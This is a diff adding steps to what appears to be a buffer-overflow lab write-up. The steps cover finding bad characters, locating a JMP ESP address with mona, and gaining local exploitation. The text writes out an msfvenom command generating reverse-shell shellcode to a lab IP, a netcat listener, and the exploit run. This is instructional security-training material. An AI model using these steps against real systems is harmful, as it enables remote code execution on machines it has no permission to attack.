@@ -137,6 +137,8 @@ Since the program crashed in the last step in the testing process, we will re-op
 
 <a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 
+<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
+
 Now that the program is attached and running in Immunity Debugger, we can develop a script to verify the offset value that we previously discovered. Shown in the screenshot below is the script we will use to verify the EIP Offset value. This script will connect to the target IP and port, send 142 “A’s” followed by 4 “B’s” and a return and newline character, then it closes the connection. This will effectively cause the program to crash and overwrite the EIP with **42424242**.
 
 <a href="/images/verify_py.png"><img src="/images/verify_py.png"></a>
@@ -157,3 +159,84 @@ If we take a closer look at the values located within the EIP, we will see **424
 
 #### **Finding Bad Characters**
 This step in the process will allow us to find the characters that the binary rejects (bad characters). We will accomplish by using a script that sends all **255 ASCII characters** in hexadecimal representation to the program at once. It will be fairly obvious to see what characters the program accepts and the ones that it does now. Before we get to that point we will open and attach the binary to Immunity Debugger using the steps previously outlined.
+
+<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
+
+<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
+
+Now that the program is attached and running, let’s take a look at our bad character hunting script. Shown below is the script that we will use for this part of the process.
+
+<a href="/images/bad_py.png"><img src="/images/bad_py.png"></a>
+
+This script will connect to the target IP and port, send 142 “A’s” followed with 4 “B’s” followed up by all 255 ASCII characters with a return and newline added. In order to execute the script, we will use the following command:
+```console
+python bad_char_.py
+```
+<a href="/images/bad_char.png"><img src="/images/bad_char.png"></a>
+
+As we expected, the program crashed and Immunity caught the exception.
+
+<a href="/images/imdb_5.png"><img src="/images/imdb_5.png"></a>
+
+In order to search for bad characters, we will need to **Right-Click ESP --> Follow in Dump**. This will bring up the hex dump shown in the screenshot below.
+
+<a href="/images/hex_dump.png"><img src="/images/hex_dump.png"></a>
+
+In terms of exploit development, it can be assumed that **\x00** is always going to be a bad character because it maps to nothing or NULL. We can see in the screenshot above that there is one lone bad character (outside **\x00**) and that is **\x0a**. The characters that this program rejects are **\x00\x0a**. We will use these values as our bad characters moving forward with the process. The next step is to find the return address.
+
+#### **Finding the Return Address**
+Before we can get into shell code generation and creating an exploitation proof of concept, we need to find the return address for **JMP ESP**. This will allow us to execute our shellcode in the exact location necessary to gain Remote Code Execution on the target system. We will accomplish this task using **mona.py** integrated into our Immunity Debugger install. In order to begin this process, we first need to open and attach the program in Immunity using the steps previously listed.
+
+<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
+
+<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
+
+Now that the program is loaded and running, we will search for the return address for JMP ESP that does not contain any of the bad characters that we found in the last step. We will do this by executing the following command within Immunity Debugger:
+```console
+!mona jmp -r esp -cpb "\x00\x0a"
+```
+<a href="/images/mona_jmp.png"><img src="/images/mona_jmp.png"></a>
+
+There is some valuable information that we can collect from the screenshot above. Most importantly, the return address (displayed backwards) for **JMP ESP** is **\xc3\x14\x04\x08**. The next important bit of information we can collect is that **ASLR is not present**. Now, we can generate some shell code and create a proof of concept!
+
+#### **Local Exploitation**
+To start things off, we will open and attach the program to Immunity Debugger using the steps previously listed.
+
+<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
+
+<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
+
+We will now use MSFVenom to generate custom shell code to plug into our proof of concept. The command we will use is as follows:
+```console
+ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.110.130 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
+ ```
+ <a href="/images/msfvenom_local.png"><img src="/images/msfvenom_local.png"></a>
+
+We will use this shell code to achieve a reverse TCP connection (reverse shell) from the remote host. The script we will use to accomplish this can be seen in the screenshot below.
+
+ <a href="/images/local_exploit_py.png"><img src="/images/local_exploit_py.png"></a>
+
+Now that we have our proof-of-concept script all configured, it's time to pop a shell! We will first set up a Netcat listener using the following command:
+```console
+nc -nlvp 2222
+```
+We will then use the following command to execute the exploitation script:
+```console
+python exploit.py
+```
+ <a href="/images/local_exploit.png"><img src="/images/local_exploit.png"></a>
+
+As we expected, we received a reverse TCP connection from our local Windows system! This will allow us to remotely execute commands on the target.
+
+ <a href="/images/local_shell.png"><img src="/images/local_shell.png"></a>
+
+To provide some further proof of concept, we will execute the following commands on our local Windows system through our reverse TCP connection:
+```console
+whoami
+```
+```console
+ipconfig
+```
+ <a href="/images/local_proof.png"><img src="/images/local_proof.png"></a>
+
+Now that we have proven that our proof-of-concept script works, we can make some changes that will allow us to establish a foothold on the target system.
